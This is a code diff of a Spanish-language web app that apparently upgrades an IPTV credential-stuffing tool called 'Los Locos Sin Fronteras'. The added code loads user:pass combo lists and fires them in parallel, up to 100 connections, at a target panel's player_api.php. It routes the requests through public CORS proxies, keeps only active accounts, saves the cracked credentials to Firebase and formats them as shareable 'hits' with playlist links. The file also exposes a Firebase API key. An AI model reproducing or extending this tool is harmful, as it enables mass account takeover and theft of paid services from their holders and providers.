@@ -13,13 +13,14 @@
             --input-bg: #2a3942;
             --text-main: #e9edef; 
             --text-muted: #8696a0;
-            --wa-teal: #FFDD00; /* Oro temático unificado */
+            --wa-teal: #FFDD00; 
             --danger: #ef4444;
             --success: #00a884;
             --blue-sub: #0033A0;
             --red-sub: #D52B1E;
-            --accent-start: #00ff41;
-            --accent-end: #ff003c;
+            --accent-start: #a855f7;
+            --accent-end: #22d3ee;
+            --accent-gradient: linear-gradient(180deg, var(--accent-start), var(--accent-end));
         }
         
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
@@ -78,12 +79,12 @@
         .header-actions { display: flex; gap: 6px; align-items: center; }
         .btn-action { background: #2a3942; color: white; padding: 8px 12px; font-size: 0.8rem; border-radius: 6px; border: 1px solid var(--wa-teal); }
 
-        /* NAVEGACIÓN DE SECCIONES (Ajustado para 4 pestañas en móviles) */
+        /* NAVEGACIÓN */
         .nav-tabs { display: flex; background: rgba(20,20,20,0.95); border-bottom: 1px solid #333; flex-shrink: 0; overflow-x: auto; -webkit-overflow-scrolling: touch; }
         .tab-item { flex: 1; min-width: 90px; padding: 12px 3px; text-align: center; font-size: 0.75rem; font-weight: bold; color: var(--text-muted); cursor: pointer; text-transform: uppercase; border-bottom: 3px solid transparent; white-space: nowrap; }
         .tab-item.active { color: var(--wa-teal); border-bottom-color: var(--wa-teal); background: rgba(255,221,0,0.05); }
 
-        /* CONTENEDOR DE TRABAJO */
+        /* CONTENEDOR PRINCIPAL */
         .main-content { flex: 1; overflow-y: auto; background: rgba(10,10,10,0.92); padding: 12px; display: flex; flex-direction: column; padding-bottom: calc(15px + env(safe-area-inset-bottom)); }
         
         /* BLOC DE NOTAS */
@@ -101,17 +102,26 @@
         .gen-label { font-size: 0.85rem; color: var(--text-muted); font-weight: bold; display: block; margin-top: 6px; text-align: left; }
         textarea.resultado-box { height: 180px; color: #00ff9d; background: #050505; border: 2px solid var(--blue-sub); font-family: monospace; margin-top: 10px; }
 
-        /* SECCIÓN ESCÁNER - LOS LOCOS SIN FRONTERAS */
-        .scanner-title { text-align: center; font-size: 1.2rem; font-family: 'Orbitron', monospace; background: linear-gradient(90deg, var(--accent-start), #fff, var(--accent-end)); -webkit-background-clip: text; background-clip: text; color: transparent; border: 2px solid var(--accent-start); border-radius: 8px; padding: 8px; margin-bottom: 15px; }
-        #progressContainer { border: 1px solid #333; border-radius: 10px; padding: 12px; background: #000; margin-top: 12px; }
-        #progressBar { background: #111; border-radius: 5px; height: 12px; overflow: hidden; margin: 8px 0; }
-        .bar-fill { background: linear-gradient(90deg, var(--accent-start), #fff, var(--accent-end)); height: 100%; width: 0%; transition: width .3s ease; }
-        #hitsContainer, .db-hits-container { background: #050505; border: 1px solid #222; border-radius: 10px; padding: 10px; margin-top: 12px; height: 320px; overflow-y: auto; }
+        /* NUEVO DISEÑO ESCÁNER INTEGRADO */
+        .scanner-title { text-align: center; font-size: 1.1rem; font-family: 'Orbitron', monospace; background: linear-gradient(90deg, #a855f7, #fff, #22d3ee); -webkit-background-clip: text; background-clip: text; color: transparent; border: 2px solid #a855f7; border-radius: 8px; padding: 8px; margin-bottom: 15px; animation: neonFlicker 1.5s infinite; }
         
-        .hit-block { font-family: monospace; white-space: pre-wrap; background: #000; padding: 12px; margin-bottom: 12px; border-radius: 6px; border: 1px solid #333; line-height: 1.4; color: #00ff41; position: relative; font-size: 0.85rem; }
-        .hit-block-db { border-left: 4px solid var(--wa-teal); background: #111; margin-bottom: 10px; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 0.85rem; }
+        @keyframes neonFlicker {
+            0%, 100% { text-shadow: 0 0 8px rgba(168,85,247,.7), 0 0 14px rgba(34,211,238,.7); border-color: #a855f7; }
+            50% { text-shadow: none; border-color: #222; }
+        }
+
+        .progress-job-container { margin-top: 12px; border: 2px solid transparent; border-radius: 10px; padding: 10px; background: #000; box-shadow: 0 0 12px rgba(168,85,247,.4); }
+        .progress-bar-bg { background: #111; border-radius: 10px; height: 16px; overflow: hidden; margin-top: 5px; }
+        .progress-bar-fill { background: var(--accent-gradient); height: 100%; width: 0%; transition: width .3s ease; }
+        .job-top { display: flex; justify-content: space-between; font-size: 0.8rem; font-weight: bold; color: #e6f3ff; font-family: 'Orbitron', monospace; }
+        .current-combo-text { font-size: 0.75rem; color: #22d3ee; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-top: 4px; font-family: monospace; }
+        
+        #hitsContainer, .db-hits-container { background: #050505; border: 1px solid #222; border-radius: 10px; padding: 10px; margin-top: 12px; height: 300px; overflow-y: auto; }
+        .hit-block { font-family: monospace; white-space: pre-wrap; background: #000; padding: 12px; margin-bottom: 12px; border-radius: 6px; border: 2px solid rgba(34,211,238,.4); line-height: 1.4; color: #e6f3ff; position: relative; font-size: 0.85rem; box-shadow: 0 0 10px rgba(168,85,247,0.3); }
+        .hit-block-db { border-left: 4px solid var(--wa-teal); background: #111; margin-bottom: 10px; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 0.85rem; position: relative; }
         .copy-btn { position: absolute; top: 8px; right: 8px; background: #222; color: #fff; border: 1px solid #444; padding: 4px 8px; font-size: 9px; cursor: pointer; border-radius: 4px; font-weight: bold; }
         .counter-badge { display: inline-block; background: var(--blue-sub); color: #fff; padding: 2px 6px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; margin-top: 5px; }
+        .yellow-hit { color: yellow; text-shadow: 0 0 6px yellow; font-weight: bold; }
 
         /* SECCIÓN MULTI-ADMINISTRADORES */
         .admin-box { background: var(--panel-header); padding: 15px; border-radius: 10px; margin-bottom: 15px; border: 1px solid var(--wa-teal); }
@@ -205,41 +215,66 @@
 
             <div id="secScan" class="view-section hidden">
                 <div class="scan-section">
-                    <div class="scanner-title">📡 LOS LOCOS SIN FRONTERAS 📡</div>
+                    <div class="scanner-title">📡 TRIPLE ESCÁNER LOS LOCOS SIN FRONTERAS 📡</div>
                     
-                    <span class="gen-label">Panel (host):</span>
-                    <input type="text" id="hostInput" placeholder="ejemplo.com:8080" />
+                    <span class="gen-label">Panel (host con o sin http/https):</span>
+                    <input type="text" id="hostInput" placeholder="ej: lista.com:8080" autocomplete="off" />
 
-                    <span class="gen-label">Cargar Combos (.txt):</span>
+                    <span class="gen-label">Elige archivos .txt independientes (user:pass):</span>
                     <input type="file" id="comboFile1" accept=".txt" style="font-size:11px; padding:6px; margin-bottom:4px;" />
                     <input type="file" id="comboFile2" accept=".txt" style="font-size:11px; padding:6px; margin-bottom:4px;" />
                     <input type="file" id="comboFile3" accept=".txt" style="font-size:11px; padding:6px;" />
 
-                    <span class="gen-label">Pegar Combos:</span>
-                    <textarea id="comboText" rows="3" placeholder="user:pass" style="background:#000; font-family:monospace;"></textarea>
+                    <span class="gen-label">…o pega combos (texto libre):</span>
+                    <textarea id="comboText" rows="4" placeholder="Pega cualquier texto aquí; el formato user:pass será detectado de forma automática por línea." style="background:#000; font-family:monospace;"></textarea>
 
-                    <span class="gen-label">Hilos Simultáneos:</span>
-                    <input type="number" id="concurrencyInput" value="80" />
+                    <span class="gen-label">Número de conexiones paralelas (bots):</span>
+                    <input type="number" id="concurrencyInput" value="80" min="1" max="100" />
 
-                    <div style="margin: 10px 0; font-size:0.85rem;">
+                    <div style="margin: 10px 0; font-size:0.85rem; display: flex; gap: 15px;">
                         <label><input type="checkbox" id="useCors" checked /> Proxy CORS</label>
-                        <label style="margin-left:15px"><input type="checkbox" id="soundToggle" checked /> Sonido</label>
+                        <label><input type="checkbox" id="soundToggle" checked /> 🔔 Sonido en Hit</label>
+                        <label><input type="checkbox" id="autoDownload" checked /> ⬇️ Auto-Descarga</label>
                     </div>
 
-                    <button id="startBtn" style="background:var(--success); width:100%;">INICIAR ESCANEO</button>
-                    <button id="stopBtn" class="btn-danger" style="margin-top:5px; width:100%;" disabled>DETENER</button>
-                    <button id="saveBtn" style="background:var(--blue-sub); margin-top:5px; width:100%;" disabled>DESCARGAR HITS TXT</button>
+                    <button id="startBtn" style="background:var(--success); width:100%;" disabled>INICIAR SCAN MULTI-JOB</button>
+                    <button id="stopBtn" class="btn-danger" style="margin-top:5px; width:100%;" disabled>DETENER SCAN</button>
+                    <button id="saveBtn" style="background:var(--blue-sub); margin-top:5px; width:100%;" disabled>GUARDAR TODO EN TELÉFONO (.TXT)</button>
 
-                    <div id="progressContainer">
-                        <div id="hitsCountDisplay" style="color:var(--accent-start); font-weight:bold; font-size:0.9rem;">Hits Reales: 0</div>
-                        <div id="progressBar"><div id="progressBarFill" class="bar-fill"></div></div>
-                        <div id="progressText" style="font-size:0.8rem; font-family:monospace;">Esperando...</div>
+                    <div id="progressContainer" class="progress-job-container">
+                        <div class="job-top">
+                            <div>Trabajo de Análisis 1</div>
+                            <div id="hitsCount1">Hits: <span class="yellow-hit">0</span></div>
+                        </div>
+                        <div class="progress-bar-bg"><div id="progressBarFill" class="progress-bar-fill"></div></div>
+                        <div id="progressText" style="font-size:0.75rem; margin-top:4px;">Esperando inicio...</div>
+                        <div id="currentCombo" class="current-combo-text">Usuario actual: -</div>
+                    </div>
+
+                    <div id="progressContainer2" class="progress-job-container">
+                        <div class="job-top">
+                            <div>Trabajo de Análisis 2</div>
+                            <div id="hitsCount2">Hits: <span class="yellow-hit">0</span></div>
+                        </div>
+                        <div class="progress-bar-bg"><div id="progressBarFill2" class="progress-bar-fill"></div></div>
+                        <div id="progressText2" style="font-size:0.75rem; margin-top:4px;">Esperando inicio...</div>
+                        <div id="currentCombo2" class="current-combo-text">Usuario actual: -</div>
+                    </div>
+
+                    <div id="progressContainer3" class="progress-job-container">
+                        <div class="job-top">
+                            <div>Trabajo de Análisis 3</div>
+                            <div id="hitsCount3">Hits: <span class="yellow-hit">0</span></div>
+                        </div>
+                        <div class="progress-bar-bg"><div id="progressBarFill3" class="progress-bar-fill"></div></div>
+                        <div id="progressText3" style="font-size:0.75rem; margin-top:4px;">Esperando inicio...</div>
+                        <div id="currentCombo3" class="current-combo-text">Usuario actual: -</div>
                     </div>
 
                     <h4 style="margin-top:15px; color:var(--wa-teal); font-family:'Cinzel';">Resultados del Escaneo Actual:</h4>
                     <div id="hitsContainer"></div>
 
-                    <h4 style="margin-top:20px; color:var(--wa-teal); font-family:'Cinzel';">🌐 Hits Guardados en Servidor Web:</h4>
+                    <h4 style="margin-top:20px; color:var(--wa-teal); font-family:'Cinzel';">🌐 Mis Hits Guardados (Mis Escaneos en Servidor):</h4>
                     <div class="db-hits-container" id="dbHitsList"></div>
                 </div>
             </div>
@@ -265,7 +300,6 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, collection, addDoc, doc, query, orderBy, onSnapshot, serverTimestamp, updateDoc, deleteDoc, where, getDocs, increment } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        // Configuración de tu base de datos activa
         const firebaseConfig = {
             apiKey: "AIzaSyDGE5GTlwIypuryIVnDYiTR9a2wyCgWkfs",
             authDomain: "gestion-ventas-pro-f8de4.firebaseapp.com",
@@ -289,7 +323,6 @@
 
         if (sesionUsuario) { entrarAlApp(); }
 
-        // Navegación Interactiva Global
         window.switchTab = function(tab) {
             document.querySelectorAll('.view-section').forEach(el => el.classList.add('hidden'));
             document.querySelectorAll('.tab-item').forEach(el => el.classList.remove('active'));
@@ -307,16 +340,15 @@
                 document.getElementById('secAdmins').classList.remove('hidden');
                 document.getElementById('tabAdmins').classList.add('active');
             }
-        }
+        };
 
-        // Login
         document.getElementById('btnIngresar').onclick = async () => {
             const email = document.getElementById('loginEmail').value.trim();
             const pass = document.getElementById('loginPass').value.trim();
             if (!email || !pass) return alert("Por favor rellene las credenciales.");
 
             if (email === ADMIN_REAL.email && pass === ADMIN_REAL.pass) {
-                sesionUsuario = { ...ADMIN_REAL };
+                sesionUsuario = { id: "owner_global", ...ADMIN_REAL };
                 localStorage.setItem('andy_sys_session', JSON.stringify(sesionUsuario));
                 entrarAlApp();
                 return;
@@ -343,7 +375,7 @@
             escucharHitsDB();
         }
 
-        // ================= LOGICA BLOC DE NOTAS =================
+        // ================= FILTRADO INDEPENDIENTE POR ADMIN (BLOC DE NOTAS) =================
         document.getElementById('btnGuardarNota').onclick = async () => {
             const title = document.getElementById('noteTitle').value.trim();
             const content = document.getElementById('noteContent').value.trim();
@@ -354,6 +386,7 @@
                 titulo: title || "Nota Sin Título",
                 contenido: content,
                 autor: sesionUsuario.nombre || sesionUsuario.identificacion || "Administrador",
+                usuarioId: sesionUsuario.id, // ID Único de Vinculación de Credenciales
                 timestamp: serverTimestamp()
             };
 
@@ -368,7 +401,7 @@
                 }
                 document.getElementById('noteTitle').value = "";
                 document.getElementById('noteContent').value = "";
-            } catch (e) { alert("Error en bloc."); }
+            } catch (e) { alert("Error en el bloc."); }
         };
 
         document.getElementById('btnCancelarEdit').onclick = () => {
@@ -380,7 +413,12 @@
         };
 
         function escucharNotas() {
-            const q = query(collection(db, "bloc_notas_vip"), orderBy("timestamp", "desc"));
+            // El Owner ve absolutamente todo, el usuario normal solo sus credenciales asignadas
+            let q = query(collection(db, "bloc_notas_vip"), orderBy("timestamp", "desc"));
+            if (sesionUsuario.role !== "owner") {
+                q = query(collection(db, "bloc_notas_vip"), where("usuarioId", "==", sesionUsuario.id), orderBy("timestamp", "desc"));
+            }
+            
             onSnapshot(q, (snapshot) => {
                 const list = document.getElementById('notesList');
                 list.innerHTML = "";
@@ -477,43 +515,110 @@
             l.href = URL.createObjectURL(b); l.download = "combos_andy.txt"; l.click();
         };
 
-        // ================= LOGICA ESCÁNER: LOS LOCOS SIN FRONTERAS =================
-        let isRunning = false, stopRequested = false, currentScanHits = [];
-        const CORS_PROXIES = ['https://corsproxy.io/?{url}', 'https://api.allorigins.win/raw?url={url}'];
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        // ================= NUEVA ARQUITECTURA: TRIPLE ESCÁNER MUNRRA TV PROFESIONAL =================
+        let isRunning = false;
+        let stopRequested = false;
+        let combos1 = [], combos2 = [], combos3 = [], combosTxt = [];
+        const HITS = { 1: [], 2: [], 3: [] };
+        let JOB_PROXIES = {};
 
+        const CORS_PROXIES = [
+            'https://corsproxy.io/?{url}',
+            'https://api.allorigins.win/raw?url={url}',
+            'https://cors.isomorphic-git.org/{url}',
+            'https://thingproxy.freeboard.io/fetch/{url}'
+        ];
+
+        let audioCtx = null;
         function playHitSound() {
             if (!document.getElementById('soundToggle').checked) return;
-            const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain();
-            osc.frequency.setValueAtTime(880, audioCtx.currentTime);
-            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
-            osc.connect(gain); gain.connect(audioCtx.destination);
-            osc.start(); osc.stop(audioCtx.currentTime + 0.5);
+            try {
+                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const o = audioCtx.createOscillator(), g = audioCtx.createGain();
+                o.type = 'sine'; o.frequency.setValueAtTime(880, audioCtx.currentTime);
+                g.gain.setValueAtTime(0, audioCtx.currentTime);
+                g.gain.linearRampToValueAtTime(0.22, audioCtx.currentTime + 0.01);
+                g.gain.exponentialRampToValueAtTime(0.0008, audioCtx.currentTime + 0.18);
+                o.connect(g); g.connect(audioCtx.destination); o.start(); o.stop(audioCtx.currentTime + 0.2);
+            } catch (_) {}
         }
 
-        async function validate(host, user, pass) {
-            try {
-                const cleanHost = host.trim().replace(/^https?:\/\//, '').replace(/\/$/, '');
-                const url = `http://${cleanHost}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
-                const proxy = CORS_PROXIES[Math.floor(Math.random() * CORS_PROXIES.length)];
-                const finalUrl = document.getElementById('useCors').checked ? proxy.replace('{url}', encodeURIComponent(url)) : url;
+        function limpiarHost(host) { return host.replace(/^https?:\/\//, '').trim(); }
 
-                const res = await fetch(finalUrl); const data = await res.json();
-                if (data?.user_info && (data.user_info.auth == 1)) {
-                    const info = data.user_info;
-                    if (info.status === 'Expired' || info.status === 'Banned') return null;
-                    return { 
-                        user, pass, host: cleanHost, status: info.status || "Active",
-                        exp: info.exp_date ? new Date(info.exp_date * 1000).toISOString().replace('T',' ').split('.')[0] : "Ilimitada",
-                        max: info.max_connections || "1", active: info.active_cons || "0"
-                    };
+        function extractCombo(line) {
+            if (!line) return null;
+            let s = String(line).normalize('NFKC').replace(/\s+/g, ' ').trim();
+            const m = s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u);
+            if (!m) return null;
+            return [m[1].trim(), m[2].trim()];
+        }
+
+        function readTxtFile(inputEl, targetArray) {
+            targetArray.length = 0;
+            const f = inputEl.files?.[0];
+            if (!f) { updateStartState(); return; }
+            const r = new FileReader();
+            r.onload = e => {
+                const lines = String(e.target.result || '').split(/\r?\n/);
+                for (const line of lines) {
+                    const pair = extractCombo(line.trim());
+                    if (pair) targetArray.push(`${pair[0]}:${pair[1]}`);
                 }
-            } catch (e) {}
-            return null;
+                updateStartState();
+            };
+            r.readAsText(f);
+        }
+
+        document.getElementById('comboFile1').addEventListener('change', () => readTxtFile(document.getElementById('comboFile1'), combos1));
+        document.getElementById('comboFile2').addEventListener('change', () => readTxtFile(document.getElementById('comboFile2'), combos2));
+        document.getElementById('comboFile3').addEventListener('change', () => readTxtFile(document.getElementById('comboFile3'), combos3));
+
+        document.getElementById('comboText').addEventListener('input', () => {
+            combosTxt.length = 0;
+            const raw = document.getElementById('comboText').value || '';
+            if (raw) {
+                const lines = raw.split(/\r?\n/);
+                for (const line of lines) {
+                    const pair = extractCombo(line);
+                    if (pair) combosTxt.push(`${pair[0]}:${pair[1]}`);
+                }
+            }
+            updateStartState();
+        });
+
+        document.getElementById('hostInput').addEventListener('input', updateStartState);
+
+        function updateStartState() {
+            const hasHost = !!document.getElementById('hostInput').value.trim();
+            const hasAnyCombos = (combos1.length || combos2.length || combos3.length || combosTxt.length);
+            document.getElementById('startBtn').disabled = !(hasHost && hasAnyCombos);
+        }
+
+        async function fetchTimeout(url, opts = {}, ms = 6000) {
+            const ctrl = new AbortController();
+            const id = setTimeout(() => ctrl.abort(), ms);
+            try {
+                const res = await fetch(url, { ...opts, signal: ctrl.signal });
+                clearTimeout(id);
+                return res;
+            } catch (e) {
+                clearTimeout(id);
+                throw e;
+            }
+        }
+
+        async function fetchWithCors(url, options = {}, jobId = null) {
+            if (document.getElementById('useCors').checked && jobId && JOB_PROXIES[jobId]) {
+                try {
+                    const proxied = JOB_PROXIES[jobId].replace('{url}', encodeURIComponent(url));
+                    return await fetchTimeout(proxied, options);
+                } catch (_) {}
+            }
+            return await fetchTimeout(url, options);
         }
 
         function formatHitText(h) {
-            const m3u = `http://${h.host}/get.php?username=${h.user}&password=${h.pass}&type=m3u_plus`;
+            const m3u = `http://${h.host}/get.php?username=${encodeURIComponent(h.user)}&password=${encodeURIComponent(h.pass)}&type=m3u_plus`;
             return `╭─➤ 𝗛𝗶𝘁𝘀 ʙʏ 📡 LOS LOCOS SIN FRONTERAS 📡
 ├● 🎧💥🔥 GRUPO L.S.F 🔥💥🎧
 ├●🔸🌐Host ➤ http://${h.host}
@@ -533,70 +638,173 @@
 ╰─➤🌟LOS LOCOS SIN FRONTERAS PREMIUM 24/7🌟`;
         }
 
-        document.getElementById('startBtn').onclick = async () => {
-            const host = document.getElementById('hostInput').value.trim();
-            const concurrency = parseInt(document.getElementById('concurrencyInput').value) || 20;
-            if (!host) return alert("Ingresa un Host");
+        async function validarCombo(host, combo, ui, jobId) {
+            if (stopRequested) return null;
+            const pair = extractCombo(combo);
+            if (!pair) return null;
+            const [user, pass] = pair;
 
-            let allLines = [];
-            const files = [document.getElementById('comboFile1'), document.getElementById('comboFile2'), document.getElementById('comboFile3')];
-            for (let f of files) if (f.files[0]) allLines = allLines.concat((await f.files[0].text()).split(/\r?\n/));
-            if (document.getElementById('comboText').value) allLines = allLines.concat(document.getElementById('comboText').value.split(/\r?\n/));
-                
-            const combos = allLines.filter(l => l.includes(':')).map(l => {
-                const p = l.split(':'); return [p[0].trim(), p[1].trim()];
-            });
-            if (combos.length === 0) return alert("Sin combos válidos");
+            if (ui.user) ui.user.textContent = `Usuario actual: ${user}:${pass}`;
 
-            isRunning = true; stopRequested = false; currentScanHits = [];
-            document.getElementById('hitsContainer').innerHTML = '';
-            document.getElementById('startBtn').disabled = true; document.getElementById('stopBtn').disabled = false;
-            let processed = 0, index = 0;
+            const protos = ['http://', 'https://'];
+            let data = null;
+
+            for (const p of protos) {
+                const url = `${p}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+                try {
+                    const res = await fetchWithCors(url, { cache: 'no-store' }, jobId);
+                    if (res.ok) { data = await res.json(); break; }
+                } catch (_) {}
+            }
+
+            if (!data || !data.user_info) return null;
+            const uinfo = data.user_info;
+            const ok = (uinfo.status === 'Active') || String(uinfo.auth) === '1' || String(uinfo.auth).toLowerCase() === 'true';
+            if (!ok || uinfo.status === 'Expired' || uinfo.status === 'Banned') return null;
+
+            return {
+                user, pass, host,
+                exp: uinfo.exp_date ? new Date(uinfo.exp_date * 1000).toISOString().replace('T',' ').split('.')[0] : "Ilimitada",
+                max: uinfo.max_connections || "1",
+                active: uinfo.active_cons || "0"
+            };
+        }
+
+        function uiFor(job) {
+            return {
+                fill: document.getElementById(job === 1 ? 'progressBarFill' : (job === 2 ? 'progressBarFill2' : 'progressBarFill3')),
+                text: document.getElementById(job === 1 ? 'progressText' : (job === 2 ? 'progressText2' : 'progressText3')),
+                user: document.getElementById(job === 1 ? 'currentCombo' : (job === 2 ? 'currentCombo2' : 'currentCombo3')),
+                hitsCountEl: document.getElementById(job === 1 ? 'hitsCount1' : (job === 2 ? 'hitsCount2' : 'hitsCount3')),
+                hitsArr: HITS[job]
+            };
+        }
+
+        async function processarCombosJob(host, combos, conc, jobId) {
+            const ui = uiFor(jobId);
+            ui.hitsArr.length = 0;
+            
+            let total = combos.length;
+            let processed = 0;
+            let index = 0;
+
+            const sleep = ms => new Promise(r => setTimeout(r, ms));
 
             async function worker() {
-                while (index < combos.length && !stopRequested) {
-                    const currentIdx = index++; const [u, p] = combos[currentIdx];
-                    const hit = await validate(host, u, p);
+                while (index < total && !stopRequested) {
+                    const i = index++;
+                    if (i >= total) break;
+
+                    const hit = await validarCombo(host, combos[i], ui, jobId);
+                    if (stopRequested) break;
+
                     if (hit) {
-                        currentScanHits.push(hit); playHitSound();
+                        ui.hitsArr.push(hit);
+                        playHitSound();
                         const formatted = formatHitText(hit);
-                        
-                        // Guardar en la Web (Firebase Firestore) ordenado por tiempo de servidor
+
+                        // Guardar en la Web vinculando el ID único del usuario activo
                         try {
                             await addDoc(collection(db, "hits_escaneados"), {
                                 host: hit.host, user: hit.user, pass: hit.pass, exp: hit.exp, max: hit.max, active: hit.active,
-                                textoFormateado: formatted, contadorCopias: 0, timestamp: serverTimestamp()
+                                textoFormateado: formatted, contadorCopias: 0, 
+                                usuarioId: sesionUsuario.id, // Vínculo estricto de Credencial
+                                timestamp: serverTimestamp()
                             });
-                        } catch(err){}
+                        } catch (err) {}
 
                         const div = document.createElement('div'); div.className = 'hit-block';
-                        div.innerHTML = `[Guardando en Servidor Web...] <br>${formatted}`;
+                        div.innerHTML = `[Guardado en Servidor Web...] <br>${formatted}`;
                         document.getElementById('hitsContainer').prepend(div);
-                        document.getElementById('hitsCountDisplay').innerText = `Hits Reales: ${currentScanHits.length}`;
                     }
                     processed++;
-                    document.getElementById('progressBarFill').style.width = (processed / combos.length) * 100 + '%';
-                    document.getElementById('progressText').innerText = `Procesados: ${processed} / ${combos.length}`;
+                    if (ui.fill) ui.fill.style.width = ((processed / total) * 100) + '%';
+                    if (ui.text) ui.text.textContent = `Procesados: ${processed} / ${total}`;
+                    if (ui.hitsCountEl) ui.hitsCountEl.innerHTML = `Hits: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
+                    
+                    await sleep(50 + Math.random() * 100);
                 }
             }
-            const pool = Array.from({ length: Math.min(concurrency, combos.length) }, () => worker());
-            await Promise.all(pool);
 
-            isRunning = false; document.getElementById('startBtn').disabled = false; document.getElementById('stopBtn').disabled = true;
-            document.getElementById('saveBtn').disabled = currentScanHits.length === 0;
+            if (ui.text) ui.text.textContent = "Iniciando scan...";
+            await Promise.all(Array.from({ length: Math.min(conc, total) }, () => worker()));
+            if (ui.text) ui.text.textContent = stopRequested ? "Scan detenido." : "Scan finalizado.";
+        }
+
+        document.getElementById('startBtn').onclick = async () => {
+            if (isRunning) return;
+            isRunning = true;
+            stopRequested = false;
+
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+            document.getElementById('saveBtn').disabled = true;
+            document.getElementById('hitsContainer').innerHTML = '';
+
+            const host = limpiarHost(document.getElementById('hostInput').value);
+            const baseConc = parseInt(document.getElementById('concurrencyInput').value) || 80;
+
+            if (combosTxt.length) {
+                combos1 = combos1.concat(combosTxt);
+                combosTxt = [];
+                document.getElementById('comboText').value = '';
+            }
+
+            JOB_PROXIES = { 
+                1: CORS_PROXIES[0], 
+                2: CORS_PROXIES[1 % CORS_PROXIES.length], 
+                3: CORS_PROXIES[2 % CORS_PROXIES.length] 
+            };
+
+            const activeJobs = [combos1.length > 0, combos2.length > 0, combos3.length > 0].filter(Boolean).length || 1;
+            const perConc = Math.max(1, Math.floor(baseConc / activeJobs));
+
+            const jobs = [];
+            if (combos1.length) jobs.push(processarCombosJob(host, combos1, perConc, 1));
+            if (combos2.length) jobs.push(processarCombosJob(host, combos2, perConc, 2));
+            if (combos3.length) jobs.push(processarCombosJob(host, combos3, perConc, 3));
+
+            if (jobs.length === 0) {
+                isRunning = false;
+                updateStartState();
+                return;
+            }
+
+            Promise.allSettled(jobs).then(() => {
+                isRunning = false;
+                document.getElementById('stopBtn').disabled = true;
+                document.getElementById('startBtn').disabled = false;
+                document.getElementById('saveBtn').disabled = false;
+
+                const totalHits = HITS[1].length + HITS[2].length + HITS[3].length;
+                if (document.getElementById('autoDownload').checked && totalHits > 0) {
+                    descargarHitsLocales();
+                }
+                updateStartState();
+            });
         };
 
-        document.getElementById('stopBtn').onclick = () => stopRequested = true;
-        
-        document.getElementById('saveBtn').onclick = () => {
-            const txt = currentScanHits.map(formatHitText).join('\n\n' + '='.repeat(30) + '\n\n');
-            const blob = new Blob([txt], { type: 'text/plain' }); const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob); a.download = `HITS_LOS_LOCOS_SIN_FRONTERAS.txt`; a.click();
-        };
+        document.getElementById('stopBtn').onclick = () => { stopRequested = true; };
 
-        // Escuchar y desplegar de Firebase todos los Hits ordenados por Fecha con contador de Copias
+        function descargarHitsLocales() {
+            const all = [...HITS[1], ...HITS[2], ...HITS[3]];
+            const txt = all.map(formatHitText).join('\n\n' + '='.repeat(40) + '\n\n');
+            const blob = new Blob([txt], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `SCAN_GLOBAL_${limpiarHost(document.getElementById('hostInput').value)}.txt`;
+            a.click();
+        }
+        document.getElementById('saveBtn').onclick = descargarHitsLocales;
+
+        // ================= FILTRADO INDEPENDIENTE EN REALTIME (HITS DEL SERVIDOR) =================
         function escucharHitsDB() {
-            const q = query(collection(db, "hits_escaneados"), orderBy("timestamp", "desc"));
+            // Regla de Oro: El Owner ve los de todos. El Admin solo ve lo procesado bajo su sesión activa
+            let q = query(collection(db, "hits_escaneados"), orderBy("timestamp", "desc"));
+            if (sesionUsuario.role !== "owner") {
+                q = query(collection(db, "hits_escaneados"), where("usuarioId", "==", sesionUsuario.id), orderBy("timestamp", "desc"));
+            }
+
             onSnapshot(q, (snapshot) => {
                 const list = document.getElementById('dbHitsList');
                 list.innerHTML = "";
@@ -604,7 +812,6 @@
                     const id = docSnap.id; const data = docSnap.data();
                     const div = document.createElement('div');
                     div.className = "hit-block-db";
-                    div.style.position = "relative";
                     
                     let dateStr = "Fecha Pendiente";
                     if(data.timestamp) { dateStr = new Date(data.timestamp.seconds * 1000).toLocaleString(); }
@@ -620,14 +827,11 @@
             });
         }
 
-        // Sumar +1 al contador de copias en la base de datos de forma colectiva
         window.copiarYContarHit = async function(id, texto) {
             navigator.clipboard.writeText(texto).then(async () => {
-                alert("Hit Copiado. Se actualizó el contador en el servidor.");
+                alert("Hit Copiado. Contador sincronizado en servidor.");
                 try {
-                    await updateDoc(doc(db, "hits_escaneados", id), {
-                        contadorCopias: increment(1)
-                    });
+                    await updateDoc(doc(db, "hits_escaneados", id), { contadorCopias: increment(1) });
                 } catch(e){}
             }).catch(() => alert("No se pudo copiar automáticamente."));
         };
